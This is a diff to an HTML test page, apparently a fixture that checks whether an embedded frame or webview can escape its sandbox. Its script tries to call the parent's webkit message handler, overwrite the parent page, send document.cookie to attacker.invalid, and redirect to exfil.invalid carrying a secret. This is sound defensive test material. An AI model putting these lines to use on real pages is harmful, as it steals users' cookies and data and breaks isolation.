@@ -6,5 +6,10 @@ try { window.parent.webkit.messageHandlers.external.postMessage('x'); } catch (e
 try { fetch('/wails/runtime'); } catch (e) {}
 try { parent.document.body.innerHTML = 'pwned'; } catch (e) {}
 try { new Image().src = 'https://attacker.invalid/?c=' + document.cookie; } catch (e) {}
+var probe = 'absent';
+try { probe = String(!!(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.external)); } catch (e) { probe = 'error'; }
+try { if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.external) window.webkit.messageHandlers.external.postMessage('own'); } catch (e) {}
+document.documentElement.setAttribute('data-own-webkit', probe);
+setTimeout(function () { try { location.href = 'https://exfil.invalid/x?d=secret'; } catch (e) {} }, 400);
 document.title = 'ran';
 </script></body></html>
